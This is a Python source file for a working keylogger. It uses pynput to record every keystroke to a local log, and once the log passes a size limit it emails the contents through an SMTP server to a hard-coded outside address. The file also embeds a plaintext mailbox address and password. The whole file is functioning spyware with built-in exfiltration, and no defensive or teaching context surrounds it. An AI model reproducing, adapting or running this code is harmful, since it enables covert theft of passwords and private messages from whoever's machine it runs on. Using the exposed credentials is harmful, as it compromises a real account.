import os
from pynput.keyboard import Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configuration
LOG_FILE = "keystrokes.log"
FILE_SIZE_LIMIT = 548  # 2KB in bytes
EMAIL_ADDRESS = "test_0410@zohomail.eu"  # Replace with your email
EMAIL_PASSWORD = "Test@1004"    # Replace with your app password
RECIPIENT_EMAIL = "piyushy1@gmail.com"  # Replace with recipient email
SMTP_SERVER = "smtp.zoho.eu"
SMTP_PORT = 587

# Log keystrokes to file
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key) + " ")
        # Check file size
        if os.path.getsize(LOG_FILE) > FILE_SIZE_LIMIT:
            send_email()
    except Exception as e:
        print(f"Error: {e}")

# Send email with log file contents
def send_email():
    try:
        # Read log file
        with open(LOG_FILE, "r") as f:
            log_content = f.read()

        # Create email
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT_EMAIL
        msg["Subject"] = "Keystroke Log"
        msg.attach(MIMEText(log_content, "plain"))

        # Connect to SMTP server
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())

        # Clear log file
        open(LOG_FILE, "w").close()
        print("Email sent and log cleared")
    except Exception as e:
        print(f"Email error: {e}")

# Main script
if __name__ == "__main__":
    # Ensure log file exists
    open(LOG_FILE, "a").close()
    
    # Start keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()